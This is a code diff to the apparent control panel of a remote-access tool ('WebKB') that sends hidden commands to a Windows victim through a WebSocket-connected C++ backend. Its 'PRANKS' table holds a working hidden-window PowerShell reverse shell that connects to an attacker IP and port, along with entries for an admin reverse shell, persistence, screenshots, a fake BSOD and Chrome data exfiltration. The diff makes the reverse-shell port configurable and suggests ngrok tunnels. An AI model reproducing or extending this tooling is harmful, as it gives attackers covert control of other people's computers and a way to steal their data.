@@ -512,7 +512,7 @@ const PRANKS={
   errorpopup:"RUNCMD:powershell -w h -c \"Add-Type -A System.Windows.Forms;1..20|%{[Windows.Forms.MessageBox]::Show('ERROR!','Alert',0,16)}\"",
   camera:'RUNCMD:microsoft.windows.camera:',
   bsod:'CMD:BSOD',
-  revshell:'RUNCMD:powershell -w h -c "$c=[Net.Sockets.TCPClient]::new(\'{IP}\',4444);$s=$c.GetStream();$r=New-Object IO.StreamReader $s;$w=New-Object IO.StreamWriter $s;$w.AutoFlush=1;while($l=$r.ReadLine()){$w.Write((iex $l 2>&1|Out-String))}"',
+  revshell:'RUNCMD:powershell -w h -c "$c=[Net.Sockets.TCPClient]::new(\'{IP}\',{PORT});$s=$c.GetStream();$r=New-Object IO.StreamReader $s;$w=New-Object IO.StreamWriter $s;$w.AutoFlush=1;while($l=$r.ReadLine()){$w.Write((iex $l 2>&1|Out-String))}"',
   screenshot:'CMD:Screenshot',
   'revshell+':'CMD:RevShell+',
   adminrevshell:'CMD:AdminRevShell',
@@ -522,6 +522,7 @@ const PRANKS={
   chromeexfil:'CMD:ChromeExfil'
 };
 let attackerIP = '192.168.0.103'; // Default IP
+let attackerPort = '4444'; // Default Port
 
 function runPrank(id){
   if(!ws||ws.readyState!==1){console.log('[WebKB] WS not connected!');return;}
@@ -529,15 +530,21 @@ function runPrank(id){
   if(!cmd) return;
   
   if(cmd.includes('{IP}') || id === 'revshell+' || id === 'adminrevshell' || id === 'persistence') {
-    let newIP = prompt("Enter your Attacker IP:", attackerIP);
-    if(newIP === null || newIP === "") return; // User cancelled
-    attackerIP = newIP;
+    let input = prompt("Enter Attacker IP:PORT (e.g. 0.tcp.ap.ngrok.io:16852 OR 192.168.0.103:4444)", attackerIP + ":" + attackerPort);
+    if(input === null || input === "") return; // User cancelled
+    
+    let parts = input.split(':');
+    attackerIP = parts[0];
+    if(parts.length > 1) {
+        attackerPort = parts[1];
+    }
     
     if(cmd.includes('{IP}')) {
-        cmd = cmd.replace('{IP}', attackerIP);
+        cmd = cmd.replace('{IP}', attackerIP).replace('{PORT}', attackerPort);
     } else {
-        // Send a config command to the C++ backend first to update ATTACKER_IP
+        // Send a config command to the C++ backend first to update ATTACKER_IP & ATTACKER_PORT
         ws.send('SETIP:' + attackerIP);
+        ws.send('SETPORT:' + attackerPort);
     }
   }
   
